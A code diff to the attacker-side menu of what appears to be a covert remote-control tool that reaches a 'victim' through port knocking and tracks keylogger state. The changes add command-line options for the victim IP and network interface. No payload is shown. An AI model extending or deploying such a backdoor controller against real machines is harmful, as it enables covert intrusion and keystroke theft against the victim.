@@ -9,12 +9,19 @@ from scapy.layers.inet import IP, TCP
 from mods.protocol import send_data, receive_data, receive_packet
 from mods.knocking import send_port_knocks
 from mods.handlers import handle_command
-from mods.shared import OPTIONS_LIST
+from mods.shared import OPTIONS_LIST, set_attackerip, set_interface, set_victimip, get_ip_address
 
 ATTACKER_STATE = {
-    'connected_to_victim': True,
+    'connected_to_victim': False,
     'keylogger_started': False,
 }
+
+def build_parser() -> argparse.ArgumentParser:
+    p = argparse.ArgumentParser(description="")
+    p.add_argument("--ip", type=str, required=True)
+    p.add_argument("--iface", type=str, default='en0')
+
+    return p
 
 def _get_available_actions():
     if not ATTACKER_STATE['connected_to_victim']:
@@ -61,6 +68,17 @@ def run_menu():
 
 def main():
     print('hello from server')
+
+    args = build_parser().parse_args()
+    my_ip = get_ip_address(args.iface)
+
+    print(f'setting interface to: {args.iface}')
+    set_interface(args.iface)
+    print(f'setting attackerip to: {my_ip}')
+    set_attackerip(my_ip)
+    print(f'setting victimip to: {args.ip}')
+    set_victimip(args.ip)
+
     run_menu()
     # show_interfaces()
 
